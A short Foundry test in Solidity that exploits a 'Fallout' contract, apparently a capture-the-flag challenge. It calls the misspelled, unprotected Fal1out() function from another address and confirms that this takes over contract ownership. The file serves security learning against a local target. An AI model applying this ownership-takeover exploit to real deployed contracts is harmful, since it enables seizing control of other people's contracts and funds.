// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutTest is Test {
    Fallout public fao;

    address alice = address(1);

    function setUp() public {
        fao = new Fallout();
    }

    function testAttack() public {
        vm.prank(alice);
        fao.Fal1out();

        address owner = fao.owner();
        assertEq(owner, alice);
    }
}
